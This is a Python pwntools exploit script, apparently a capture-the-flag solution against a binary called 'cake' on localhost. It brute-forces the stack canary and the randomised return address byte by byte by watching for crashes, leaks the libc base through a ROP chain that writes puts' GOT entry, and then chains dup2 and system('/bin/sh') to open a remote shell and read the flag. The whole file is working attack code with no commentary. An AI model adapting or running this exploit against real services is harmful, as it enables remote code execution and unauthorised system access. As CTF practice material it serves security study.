import pwn
import tqdm

HOST = 'localhost'
PORT = 4242

BINARY_PATH = './cake'
binary = pwn.ELF(BINARY_PATH)

LIBC_PATH = './libc.so.6'
libc = pwn.ELF(LIBC_PATH)

pwn.context.binary = binary
pwn.context.log_level = 'warn'

BUFFER_TO_CANARY_PADDING = pwn.pack(0xdeadbeefdeadbeef) * 13

CANARY_TO_RETURN_ADDRESS_PADDING = (
        pwn.pack(0xdeadbeefdeadbeef) * 1 +
        pwn.pack(4) +
        pwn.pack(0xdeadbeefdeadbeef) * 3
)

RETURN_ADDRESS_LOW_BYTE = b'\x23'

RETURN_ADDRESS_MAIN_OFFSET = 451


def crashes(payload):
    with pwn.remote(HOST, PORT) as target:
        target.sendline(payload)
        try:
            target.recvuntil(b'Still alive...\n')
        except EOFError:
            return True
        else:
            return False


def brute_force_byte_by_byte(prefix, length):
    for _ in tqdm.tqdm(range(length)):
        for byte_candidate in range(256):
            if (not chr(byte_candidate) == '\n') and (not crashes(prefix + bytes([byte_candidate]))):
                prefix += bytes([byte_candidate])
                break
        else:
            print('unable to brute force byte')
            exit()
    return prefix


####################
# BRUTE FORCE CANARY #
####################

print('brute forcing canary...')
padding_and_canary = brute_force_byte_by_byte(BUFFER_TO_CANARY_PADDING, 8)
print(f'canary: {hex(pwn.unpack(padding_and_canary[-8:]))}')
padding_and_canary += CANARY_TO_RETURN_ADDRESS_PADDING

####################
# BRUTE FORCE ASLR #
####################

print('brute forcing ASLR...')
padding_and_canary_and_return_address = brute_force_byte_by_byte(padding_and_canary + RETURN_ADDRESS_LOW_BYTE, 7)
return_address = pwn.unpack(padding_and_canary_and_return_address[-8:])
print(f'return address: {hex(return_address)}')

main_address = return_address - RETURN_ADDRESS_MAIN_OFFSET
binary.address = main_address - binary.symbols['main']
print('binary base address:', hex(binary.address))


def get_pipe_after_rop(rop_chain):
    target = pwn.remote(HOST, PORT)
    target.sendline(padding_and_canary + rop_chain.chain())
    target.recvuntil(b'cake :(\n')
    return target


####################
# GET LIBC ADDRESS #
####################

rop = pwn.ROP(binary)
rop.rsi = binary.got['puts']
rop.write()

puts_address = pwn.unpack(get_pipe_after_rop(rop).recv(8))

libc.address = puts_address - libc.symbols['puts']
print('libc base address:', hex(libc.address))

####################
# GET A SHELL      #
####################

rop = pwn.ROP(libc)
# connect stdin and stdout to the TCP socket
rop.dup2(4, 0)
rop.dup2(4, 1)
# align the stack
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh\x00')))

target = get_pipe_after_rop(rop)
target.sendline(b'cat flag.txt')
target.interactive()
